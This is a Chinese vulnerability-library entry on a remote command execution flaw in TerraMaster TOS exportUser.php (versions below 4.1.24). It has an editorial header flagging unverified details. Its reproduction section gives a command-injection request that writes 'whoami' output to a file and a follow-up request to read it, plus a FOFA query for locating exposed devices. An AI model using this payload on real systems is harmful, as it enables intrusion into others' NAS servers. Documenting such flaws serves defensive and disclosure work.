---
source: "wy876 漏洞文库"
title: "TerraMaster TOS exportUser.php 远程命令执行"
product: "TerraMaster TOS"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
fofa_unverified: "TerraMaster"
source_status: "unknown"
prerequisites: "原文未完整说明身份权限、部署配置和可达性；不能假定匿名、默认开启或所有版本适用。"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-84813310d1d0c92bf9546d6a"
entity_id: "ve-84813310d1d0c92bf9546d6a"
schema_version: "1"
---

# TerraMaster TOS exportUser.php 远程命令执行

<!-- vulwiki-editorial:start -->
## 校订与适用边界


### 本次正文校订

- 保留完整原始资产表达式，未把无字段的搜索词猜改成新的 FOFA 条件；待校验字段语法。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- FOFA元数据仅TerraMaster丢失header条件
- <4.1.24未元数据化，缺修复来源
- 命令写test.txt有副作用需标
- 未经认证条件与回显请求依赖待核

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

# 一、漏洞简介
TerramasterTOS是中国深圳市图美电子技术（Terramaster）公司的一款基于Linux平台的，专用于erraMaster云存储NAS服务器的操作系统。TerramasterTOS系统 exportUser.php 存在远程代码执行漏洞，攻击者通过漏洞可以获取服务器权限，导致服务器失陷。

# 二、影响版本
+ TerraMaster TOS < 4.1.24

# 三、资产测绘
+ fofa`"TerraMaster" && header="TOS"`
+ 特征


# 四、漏洞复现
```plain
/include/exportUser.php?type=3&cla=application&func=_exec&opt=(whoami)>test.txt
```


获取命令执行结果

```plain
/include/test.txt
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/atopoc3573ymfsnt>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
